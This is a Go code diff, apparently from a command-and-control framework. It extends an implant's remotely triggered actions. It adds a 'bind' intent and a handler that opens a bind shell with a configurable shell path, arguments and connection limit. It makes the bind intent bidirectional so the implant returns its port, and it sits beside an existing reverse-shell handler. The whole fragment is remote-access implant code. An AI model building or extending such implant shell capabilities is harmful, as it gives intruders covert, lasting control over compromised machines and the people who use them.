@@ -199,7 +199,8 @@ func FireTriggerPacket(targetHost string, targetPort int, intent string, sharedS
 
 	// For bidirectional intents, use a UDP socket so we can receive the
 	// response. For fire-and-forget, use a simple dial.
-	isBidirectional := intent == "exec"
+	// "bind" is bidirectional: the implant responds with the actual port.
+	isBidirectional := intent == "exec" || intent == "bind"
 
 	if !isBidirectional {
 		// Fire-and-forget path.
@@ -433,8 +434,8 @@ func handlerForBinding(b *clientpb.TriggerIntentBinding) (stdintents.Handler, er
 		return nil, errors.New("nil binding")
 	}
 	switch cfg := b.GetConfig().(type) {
-	case *clientpb.TriggerIntentBinding_WakeBeacon:
-		return handlers.NewWakeBeacon(b.Name, cfg.WakeBeacon.GetBeaconID())
+	case *clientpb.TriggerIntentBinding_WakeCallback:
+		return handlers.NewWakeCallback(b.Name, cfg.WakeCallback.GetTargetID())
 	case *clientpb.TriggerIntentBinding_StopJob:
 		return handlers.NewStopJob(b.Name, cfg.StopJob.GetJobName())
 	case *clientpb.TriggerIntentBinding_Exec:
@@ -455,6 +456,14 @@ func handlerForBinding(b *clientpb.TriggerIntentBinding) (stdintents.Handler, er
 			DialTimeout:        time.Duration(cfg.ReverseShell.GetDialTimeoutMs()) * time.Millisecond,
 			MaxSessionDuration: time.Duration(cfg.ReverseShell.GetMaxSessionDurationMs()) * time.Millisecond,
 			UseTLS:             cfg.ReverseShell.GetUseTLS(),
+		})
+	case *clientpb.TriggerIntentBinding_Bind:
+		return handlers.NewBind(b.Name, handlers.BindHandlerConfig{
+			BindAddr:       cfg.Bind.GetBindAddr(),
+			Protocol:       cfg.Bind.GetProtocol(),
+			ShellPath:      cfg.Bind.GetShellPath(),
+			ShellArgs:      cfg.Bind.GetShellArgs(),
+			MaxConnections: int(cfg.Bind.GetMaxConnections()),
 		})
 	case nil:
 		return nil, errors.New("config oneof is unset")
